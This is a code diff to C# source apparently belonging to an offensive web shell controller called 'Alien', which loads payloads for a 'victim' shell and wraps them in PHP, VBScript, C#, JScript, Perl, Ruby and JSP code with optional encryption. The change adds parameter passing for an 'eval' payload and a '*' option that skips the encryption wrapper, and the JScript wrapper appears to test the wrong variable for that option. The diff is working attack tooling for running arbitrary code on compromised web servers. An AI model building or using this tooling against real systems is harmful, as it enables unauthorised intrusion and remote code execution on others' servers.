@@ -876,7 +876,7 @@ namespace Alien
                 }
             }
 
-            string szPayload = await fnGetPayload(szPayloadName, szSplitter);
+            string szPayload = await fnGetPayload(szPayloadName, szSplitter, asParams);
 
             if (szPayload.Contains("[ENCODING]"))
                 szPayload = szPayload.Replace("[ENCODING]", m_victim.ShellEncoding);
@@ -939,7 +939,7 @@ namespace Alien
         /// </summary>
         /// <param name="szPayloadName">Payload name, also represents to file name.</param>
         /// <returns>Payload content</returns>
-        private async Task<string> fnGetPayload(string szPayloadName, string szSplitter)
+        private async Task<string> fnGetPayload(string szPayloadName, string szSplitter, string[] asParams = null)
         {
             string szSuffix = m_dicSuffix[m_victim.ShellLanguage];
             string szPayloadFilePath = Path.Combine(new string[]
@@ -992,6 +992,9 @@ namespace Alien
 
                     string szMethod = m_victim.m_ShellConfig.szMethod;
                     szPayload = m_dicWrapper[m_victim.ShellLanguage](szMethod)(szPayload, szEncryptor);
+
+                    if (szPayloadName.Equals("eval"))
+                        asParams[0] = m_dicWrapper[m_victim.ShellLanguage](szMethod)(asParams[0], "*");
                 }
 
                 //MessageBox.Show(szPayload);
@@ -1086,34 +1089,13 @@ namespace Alien
                 MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return true;
             }
-}
-
-        private static string fnWrapVBScript(string szOriginalPayload, string szEncryptor)
-        {
-            string szHeader =
-                "\r\n" +
-                "Dim globalStringOutput\r\n" +
-                "Sub Echo(s)\r\n" +
-                "    globalStringOutput = globalStringOutput & s\r\n" +
-                "End Sub\r\n\r\n" +
-
-                (string.IsNullOrEmpty(szEncryptor) ?
-                "Function Encrypt(s)\r\n" +
-                "    ' TODO: Add VBScript encryption logic here\r\n" +
-                "    Encrypt = s\r\n" +
-                "End Function" : szEncryptor) + "\r\n\r\n";
-
-            string szFooter = "\r\n\r\nResponse.Write(Encrypt(globalStringOutput))\r\n";
-
-            string szProcessed = szOriginalPayload;
-            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "Echo", RegexOptions.IgnoreCase);
-            szProcessed = Regex.Replace(szProcessed, @"\becho\b", "Echo", RegexOptions.IgnoreCase);
-
-            return $"{szHeader}{szProcessed}{szFooter}";
         }
 
         private static string fnWrapPHP(string szOriginalPayload, string szEncryptor)
         {
+            if (szEncryptor == "*")
+                return szOriginalPayload;
+
             string szHeader =
                 "\r\n" +
                 (string.IsNullOrEmpty(szEncryptor) ?
@@ -1134,8 +1116,41 @@ namespace Alien
             return $"{szHeader}{szProcessed}{szFooter}";
         }
 
+        private static string fnWrapVBScript(string szOriginalPayload, string szEncryptor)
+        {
+            string szProcessed = szOriginalPayload;
+            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "Echo", RegexOptions.IgnoreCase);
+            szProcessed = Regex.Replace(szProcessed, @"\becho\b", "Echo", RegexOptions.IgnoreCase);
+
+            if (szEncryptor == "*")
+                return szProcessed;
+
+            string szHeader =
+                "\r\n" +
+                "Dim globalStringOutput\r\n" +
+                "Sub Echo(s)\r\n" +
+                "    globalStringOutput = globalStringOutput & s\r\n" +
+                "End Sub\r\n\r\n" +
+
+                (string.IsNullOrEmpty(szEncryptor) ?
+                "Function Encrypt(s)\r\n" +
+                "    ' TODO: Add VBScript encryption logic here\r\n" +
+                "    Encrypt = s\r\n" +
+                "End Function" : szEncryptor) + "\r\n\r\n";
+
+            string szFooter = "\r\n\r\nResponse.Write(Encrypt(globalStringOutput))\r\n";
+
+            return $"{szHeader}{szProcessed}{szFooter}";
+        }
+
         private static string fnWrapCSharp(string szOriginalPayload, string szEncryptor)
         {
+            string szProcessed = szOriginalPayload;
+            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "Echo", RegexOptions.IgnoreCase);
+
+            if (szEncryptor == "*")
+                return szProcessed;
+
             string szHeader =
                 "\r\n" +
                 (string.IsNullOrEmpty(szEncryptor) ?
@@ -1149,15 +1164,20 @@ namespace Alien
                 "Action<string> Echo = (s) => sbOutput.Append(s);\r\n\r\n";
 
             string szFooter = "\r\n\r\nResponse.Write(Encrypt(sbOutput.ToString()));\r\n";
-            string szProcessed = szOriginalPayload;
-            
-            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "Echo", RegexOptions.IgnoreCase);
 
             return $"{szHeader}{szProcessed}{szFooter}";
         }
 
         private static string fnWrapJScript(string szOriginalPayload, string szEncryptor)
         {
+            string szProcessed = szOriginalPayload;
+            szProcessed = Regex.Replace(szProcessed, @"System\.Web\.HttpContext\.Current\.Response\.Write", "Echo", RegexOptions.IgnoreCase);
+            szProcessed = Regex.Replace(szProcessed, @"Response\.Write", "Echo", RegexOptions.IgnoreCase);
+            szProcessed = Regex.Replace(szProcessed, @"\becho\b", "Echo", RegexOptions.IgnoreCase);
+
+            if (szProcessed == "*")
+                return szProcessed;
+
             string szHeader =
                 "\r\n" +
                 "var globalStringOutput = '';\r\n" +
@@ -1173,17 +1193,16 @@ namespace Alien
 
             string szFooter = "\r\n\r\nResponse.Write(Encrypt(globalStringOutput));\r\n";
 
-            string szProcessed = szOriginalPayload;
-
-            szProcessed = Regex.Replace(szProcessed, @"System\.Web\.HttpContext\.Current\.Response\.Write", "Echo", RegexOptions.IgnoreCase);
-            szProcessed = Regex.Replace(szProcessed, @"Response\.Write", "Echo", RegexOptions.IgnoreCase);
-            szProcessed = Regex.Replace(szProcessed, @"\becho\b", "Echo", RegexOptions.IgnoreCase);
-
             return $"{szHeader}{szProcessed}{szFooter}";
         }
 
         private static string fnWrapPerl(string szOriginalPayload, string szEncryptor)
         {
+            string szProcessed = szOriginalPayload;
+
+            if (szEncryptor == "*")
+                return szProcessed;
+
             string szHeader =
                 "\r\n" +
                 (string.IsNullOrEmpty(szEncryptor) ?
@@ -1205,13 +1224,17 @@ namespace Alien
                 "open(STDOUT, '>&', $oldout);\r\n" +
                 "print Encrypt($globalStringOutput);\r\n";
 
-            string szProcessed = szOriginalPayload;
-
             return $"{szHeader}{szProcessed}{szFooter}";
         }
 
         private static string fnWrapRuby(string szOriginalPayload, string szEncryptor)
         {
+            string szProcessed = szOriginalPayload;
+            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "print", RegexOptions.IgnoreCase);
+
+            if (szEncryptor == "*")
+                return szProcessed;
+
             string szHeader =
                 "\r\n" +
                 "require 'stringio';\r\n" +
@@ -1229,14 +1252,18 @@ namespace Alien
                 "$stdout = old_stdout;\r\n" +
                 "print encrypt(globalStringOutput);\r\n";
 
-            string szProcessed = szOriginalPayload;
-            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "print", RegexOptions.IgnoreCase);
-
             return $"{szHeader}{szProcessed}{szFooter}";
         }
 
         private static string fnWrapJSP(string szOriginalPayload, string szEncryptor)
         {
+            string szProcessed = szOriginalPayload;
+            szProcessed = Regex.Replace(szProcessed, @"\becho\s*\(", "Echo(", RegexOptions.IgnoreCase);
+            szProcessed = Regex.Replace(szProcessed, @"\becho[ \t]+", "Echo ", RegexOptions.IgnoreCase);
+
+            if (szEncryptor == "*")
+                return szProcessed;
+
             string szHeader =
                 "\r\n" +
                 (string.IsNullOrEmpty(szEncryptor) ?
@@ -1259,10 +1286,6 @@ namespace Alien
                 "writer.print(encryptedData);\r\n" +
                 "writer.flush();\r\n" +
                 ";null;\r\n";
-
-            string szProcessed = szOriginalPayload;
-            szProcessed = Regex.Replace(szProcessed, @"\becho\s*\(", "Echo(", RegexOptions.IgnoreCase);
-            szProcessed = Regex.Replace(szProcessed, @"\becho[ \t]+", "Echo ", RegexOptions.IgnoreCase);
 
             return $"{szHeader}{szProcessed}{szFooter}";
         }
